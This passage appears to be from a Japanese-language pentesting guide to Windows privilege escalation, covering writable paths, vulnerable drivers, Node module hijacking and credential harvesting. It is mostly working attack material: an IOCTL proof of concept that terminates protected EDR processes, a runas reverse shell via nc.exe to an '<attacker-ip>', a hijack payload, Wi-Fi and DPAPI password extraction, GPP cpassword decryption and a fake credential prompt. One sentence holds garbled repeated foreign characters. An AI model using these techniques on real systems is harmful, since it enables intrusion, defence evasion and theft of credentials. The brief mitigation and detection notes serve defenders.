icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ は `plugins` サブフォルダ内の任意の plugin DLL を自動読み込みします。書き込み可能な portable/copy install がある場合、悪意のある plugin を配置するだけで、起動のたびに `notepad++.exe` 内で自動的に code execution が発生します（`DllMain` と plugin callbacks からも）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**別の user によって実行される registry や binary を上書きできるか確認してください。**\
**権限昇格に使える興味深い autoruns locations については、以下の page を読んでください**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

可能性のある **third party weird/vulnerable** drivers を探してください
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

For race-condition bugs where the vulnerable call opens an attacker-controlled Object Manager path, deliberately slowing the lookup (using max-length components or deep directory chains) can stretch the window from microseconds to tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities let you groom deterministic layouts, abuse writable HKLM/HKU descendants, and convert metadata corruption into kernel paged-pool overflows without a custom driver. Learn the full chain here:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion from attacker-controlled paths

Some drivers accept a registry path from userland, validate only that it is a sane UTF-16 string, and then call `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` with `RTL_QUERY_REGISTRY_DIRECT` into a stack scalar such as `int readValue`. If `RTL_QUERY_REGISTRY_TYPECHECK` is missing, `EntryContext` is interpreted according to the **actual** registry type, not the type the developer expected.

This creates two useful primitives:

- **Confused deputy / oracle**: a user-controlled absolute `\Registry\...` path lets the driver query attacker-chosen keys, leak existence through return codes/logs, and sometimes read values the caller could not access directly.
- **Kernel memory corruption**: a scalar destination such as `&readValue` becomes type-confused as a `REG_QWORD`, `UNICODE_STRING`, or sized binary buffer depending on the registry value type.

Practical exploitation notes:

- **Windows 8+ mitigation**: if the query hits an **untrusted hive** with `RTL_QUERY_REGISTRY_DIRECT` but without `RTL_QUERY_REGISTRY_TYPECHECK`, kernel callers crash with `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. To keep exploitability, look for **attacker-writable keys inside trusted system hives** instead of staging values under `HKCU`.
- **Trusted-hive staging**: use NtObjectManager to enumerate writable descendants of `\Registry\Machine`, and re-run the scan with a duplicated **low-integrity** token to find keys reachable from sandboxed contexts:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 8バイトの直接書き込みを4バイトの`int`に行うと、隣接するスタックデータが壊れ、近くのcallback/function pointerを部分的に上書きできます。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode は`EntryContext`が`UNICODE_STRING`を指していることを想定します。コードがまず攻撃者制御の`REG_DWORD`をスタック上のスカラーに読み込み、その同じバッファを文字列読み取りに再利用すると、攻撃者は`Length`/`MaximumLength`を制御し、`Buffer`ポインタにも部分的に影響できるため、半制御のkernel writeにつながります。
- **`REG_BINARY`**: 大きなbinary dataでは、direct mode は`EntryContext`先頭の`LONG`を符号付きバッファサイズとして扱います。もし事前の`REG_DWORD`読み取りで、再利用されたスカラーに**負の**攻撃者制御値が残っていると、次の`REG_BINARY` query は攻撃者のバイト列を隣接するスタック領域へ直接コピーし、これがしばしばcallback-pointerを完全に上書きする最もきれいな経路になります。

強いハンティングパターン: **同じスタック変数への異種registry readsを再初期化せずに行っていること**。`RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、再利用された`EntryContext`ポインタ、そして最初のregistry readが2回目のreadを実行するかどうかを制御するコードパスをgrepしてください。

#### デバイスオブジェクトで FILE_DEVICE_SECURE_OPEN が欠落しているのを悪用する (LPE + EDR kill)

署名付きのサードパーティドライバの中には、IoCreateDeviceSecureで強力なSDDLを使ってdevice objectを作成しているのに、DeviceCharacteristicsにFILE_DEVICE_SECURE_OPENを設定し忘れているものがあります。このフラグがないと、追加のcomponentを含むpath経由でdeviceを開いた場合にsecure DACLが強制されず、権限のないユーザーでも次のようなnamespace pathを使ってhandleを取得できてしまいます:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (実際の事例より)

ユーザーがdeviceを開けるようになると、ドライバが公開している特権的なIOCTLをLPEや改ざんに悪用できます。実環境で観測された機能例:
- 任意のprocessに対してfull-access handleを返す (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser)。
- 無制限のraw disk read/write (offline tampering、boot-time persistence tricks)。
- Protected Process/Light (PP/PPL) を含む任意のprocessを終了させ、kernel経由でuser landからAV/EDR kill を可能にする。

最小PoCパターン (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
開発者向けの緩和策
- DACL によって制限されることを意図した device objects を作成する際は、常に FILE_DEVICE_SECURE_OPEN を設定する。
- 特権操作のために caller context を検証する。process termination や handle returns を許可する前に PP/PPL チェックを追加する。
- IOCTLs を制限する（access masks、METHOD_*、input validation）し、直接的な kernel privileges の代わりに brokered models を検討する。

防御側向けの検知アイデア
- 疑わしい device names（例: \\ .\\amsdk*）への user-mode opens と、悪用を示す特定の IOCTL sequences を監視する。
- Microsoft の vulnerable driver blocklist（HVCI/WDAC/Smart App Control）を適用し、独自の allow/deny lists も維持する。


## PATH DLL Hijacking

**PATH** にあるフォルダ内に **write permissions** がある場合、process によって読み込まれる DLL を hijack して **privileges を escalate** できる可能性がある。

PATH 内のすべてのフォルダの permissions を確認する:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
For more information about how to abuse this check:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` を介した Node.js / Electron モジュール解決ハイジャック

これは **Windows uncontrolled search path** の亜種で、**Node.js** および **Electron** アプリケーションが `require("foo")` のような素の import を実行し、期待されるモジュールが **存在しない** 場合に影響します。

Node はディレクトリツリーを上方向にたどり、各親ディレクトリで `node_modules` フォルダを確認してパッケージを解決します。Windows ではその走査がドライブのルートまで পৌঁ পৌঁ পৌঁ পৌঁ পৌঁ পৌঁ পৌঁ পৌঁ পৌঁ পৌঁ पहुँ するため、`C:\Users\Administrator\project\app.js` から起動されたアプリケーションは、最終的に次を探索することがあります:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**低権限ユーザー** が `C:\node_modules` を作成できる場合、悪意ある `foo.js`（または package フォルダ）を配置し、**より高い権限の Node/Electron プロセス** が不足している依存関係を解決するのを待つことができます。ペイロードは被害プロセスのセキュリティコンテキストで実行されるため、対象が管理者権限で実行されている場合、昇格された scheduled task/service wrapper から起動される場合、または自動起動する特権デスクトップアプリである場合には、これが **LPE** になります。

これは特に次のような場合に多く見られます:

- 依存関係が `optionalDependencies` に宣言されている
- サードパーティライブラリが `require("foo")` を `try/catch` で包み、失敗しても処理を継続する
- package が本番ビルドから削除された、パッケージング時に含まれなかった、またはインストールに失敗した
- 脆弱な `require()` がメインのアプリケーションコードではなく、依存ツリーの深い場所にある

### 脆弱なターゲットの探索

**Procmon** を使って解決パスを確認します:

- `Process Name` をターゲット実行ファイル (`node.exe`、Electron アプリの EXE、または wrapper process) にフィルタ
- `Path` `contains` `node_modules` にフィルタ
- `NAME NOT FOUND` と、`C:\node_modules` 配下での最終的な成功した open に注目する

展開された `.asar` ファイルやアプリケーションソースで有用なコードレビューのパターン:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### エクスプロイテーション

1. Procmon またはソースレビューから **missing package name** を特定する。
2. まだ存在しない場合は root lookup ディレクトリを作成する:
```powershell
mkdir C:\node_modules
```
3. 期待される正確な名前のモジュールをドロップする:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. 被害者アプリケーションを起動する。アプリケーションが `require("foo")` を試み、正規のモジュールが存在しない場合、Node は `C:\node_modules\foo.js` を読み込む可能性がある。

このパターンに当てはまる、欠落している optional modules の実例としては `bluebird` や `utf-8-validate` があるが、**technique** の本質は再利用できる点にある。つまり、権限の高い Windows の Node/Electron プロセスが解決しようとする、任意の **missing bare import** を見つければよい。

### Detection and hardening ideas

- ユーザーが `C:\node_modules` を作成したり、そこに新しい `.js` ファイルや package を書き込んだりしたら alert を出す。
- `C:\node_modules\*` から読み込む high-integrity プロセスを hunt する。
- production では実行時依存関係をすべて package に含め、`optionalDependencies` の使用を audit する。
- サードパーティのコードに、`try { require("...") } catch {}` のような silent パターンがないか review する。
- library がサポートしている場合は、optional probe を無効化する（たとえば一部の `ws` deployment では、`WS_NO_UTF_8_VALIDATE=1` により legacy の `utf-8-validate` probe を回避できる）。

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file にハードコードされている、既知の他のコンピュータを確認する
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェース & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

外部から**制限されたサービス**を確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARPテーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Firewall 関連コマンドはこちらのページを確認してください**](../basic-cmd-for-pentesters.md#firewall) **(ルール一覧表示、ルール作成、オフにする、オフにする...)**

[ネットワーク列挙用のコマンドはこちら](../basic-cmd-for-pentesters.md#network) でもっと見る

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

root user を取得できれば、任意の port で listen できます（`nc.exe` で初めて port を listen するとき、`nc` を firewall で許可するかどうかを GUI で確認されます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
`root` として bash を簡単に起動するには、`--default-user root` を試せます

`WSL` のファイルシステムは、`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` のフォルダで確認できます

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault は、**Windows** がユーザーに自動的に **log in** できるサーバー、Webサイト、その他のプログラムのユーザー認証情報を保存します。最初は、Facebook の認証情報、Twitter の認証情報、Gmail の認証情報などを保存して、ブラウザ経由で自動的に log in できるようにするものに見えるかもしれません。ですが、そうではありません。

Windows Vault は、Windows がユーザーに自動的に log in できる認証情報を保存します。つまり、**あるリソース（サーバーや Webサイト）にアクセスするために認証情報を必要とする任意の Windows アプリケーション** が、この Credential Manager と Windows Vault を利用して、ユーザーが毎回ユーザー名とパスワードを入力する代わりに、提供された認証情報を使えるということです。

アプリケーションが Credential Manager とやり取りしない限り、特定のリソース用の認証情報を使うことはできないと思います。したがって、アプリケーションが vault を利用したいなら、何らかの方法で **credential manager と通信し、そのリソースの認証情報をデフォルトの storage vault から要求する** 必要があります。

`cmdkey` を使って、マシンに保存されている認証情報を一覧表示します。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
すると、`runas` を `/savecred` オプション付きで使って、保存された資格情報を利用できます。以下の例では、SMB share 経由で remote binary を呼び出しています。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
提供された認証情報を使って `runas` を使用する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) から。

### DPAPI

**Data Protection API (DPAPI)** は、データの対称暗号化のための手法を提供し、主に Windows オペレーティングシステム内で非対称秘密鍵の対称暗号化に使用される。この暗号化は、ユーザーまたはシステムの secret を利用してエントロピーを大きく高める。

**DPAPI は、ユーザーのログイン secrets から導出された対称鍵によって keys を暗号化できる**。システム暗号化のシナリオでは、システムのドメイン認証 secrets を利用する。

DPAPI を使用して暗号化されたユーザーの RSA keys は、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに保存される。ここで `{SID}` はユーザーの [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を表す。**DPAPI key は、同じファイル内でユーザーの private keys を保護する master key と同じ場所に置かれ**、通常 64 バイトのランダムデータで構成される。（このディレクトリへのアクセスは制限されており、CMD の `dir` コマンドで内容を一覧表示することはできないが、PowerShell では一覧表示できる点に注意が必要である）。
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
You can use **mimikatz module** `dpapi::masterkey` with the appropriate arguments (`/pvk` or `/rpc`) to decrypt it.

**master password** で保護された **credentials files** は通常、次の場所にあります:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** は、**scripting** や自動化タスクで、暗号化された credentials を便利に保存する方法としてよく使われます。credentials は **DPAPI** によって保護されており、通常は作成されたのと同じ computer 上の同じ user だけが復号できます。

ファイルに含まれる PS credentials を **decrypt** するには、次のようにします:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存されたRDP接続

それらは `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\` にあります

### 最近実行されたコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
**Mimikatz** `dpapi::rdg` モジュールと適切な `/masterkey` を使って、**任意の .rdg ファイルを復号**します\
Mimikatz の `sekurlsa::dpapi` モジュールを使うと、メモリから**多数の DPAPI masterkey** を抽出できます

### Sticky Notes

Windows ワークステーションでは、StickyNotes アプリを使って**パスワード**やその他の情報を保存していることがよくありますが、これがデータベースファイルであることを認識していない場合があります。このファイルは `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にあり、検索して確認する価値が常にあります。

### AppCmd.exe

**AppCmd.exe からパスワードを回収するには、Administrator であり、High Integrity level で実行する必要があることに注意してください。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。\
このファイルが存在する場合、何らかの **credentials** が設定されていて、**recovered** できる可能性があります。

このコードは [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) から抽出されました:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認します。\
インストーラーは **SYSTEM権限で実行** され、多くは **DLL Sideloading（情報元は** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）** に脆弱です。
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Files and Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

SSH private keys can be stored inside the registry key `HKCU\Software\OpenSSH\Agent\Keys` なので、そこに何か興味深いものがないか確認してください:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
そのパス内に何かエントリが見つかれば、それは保存された SSH key である可能性が高いです。これは暗号化された状態で保存されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使えば簡単に復号できます。\
この手法の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

もし `ssh-agent` service が動作しておらず、起動時に自動的に開始したい場合は、次を実行します:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この technique はもう有効ではないようです。いくつかの ssh keys を作成し、`ssh-add` でそれらを追加して、ssh 経由で machine に login してみました。registry HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon でも asymmetric key authentication 中に `dpapi.dll` の使用は確認できませんでした。

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
**metasploit** を使ってこれらのファイルを検索することもできます: _post/windows/gather/enum_unattend_

Example content:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM バックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** というファイルを検索する

### Cached GPP Pasword

以前、Group Policy Preferences (GPP) を使って、Group Policy 経由で複数のマシンにカスタムのローカル管理者アカウントを展開できる機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。まず、SYSVOL に XML ファイルとして保存される Group Policy Objects (GPOs) は、任意のドメインユーザーがアクセス可能でした。次に、公開されている既知のデフォルトキーを使って AES256 で暗号化されたこれらの GPP 内のパスワードは、認証済みユーザーであれば復号できました。これは、ユーザーが昇格した権限を得られる可能性があるため、深刻なリスクでした。

このリスクを軽減するために、空でない "cpassword" フィールドを含むローカルにキャッシュされた GPP ファイルをスキャンする関数が作成されました。そのようなファイルを見つけると、この関数はパスワードを復号し、カスタム PowerShell オブジェクトを返します。このオブジェクトには GPP の詳細とファイルの場所が含まれており、このセキュリティ脆弱性の特定と修正に役立ちます。

これらのファイルを `C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ で検索する:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec を使ってパスワードを取得する:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
認証情報を含む web.config の例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 認証情報を求める

ユーザーに自分の**credentials**、あるいは知っているなら**別のユーザーのcredentials**を入力するよう、常に**ask**できます（ただし、クライアントに直接**credentials**を**ask**するのは本当に**risky**であることに注意してください）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **認証情報を含む可能性のあるファイル名**

以前に **clear-text** または **Base64** で **passwords** を含んでいたことがある既知のファイル
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
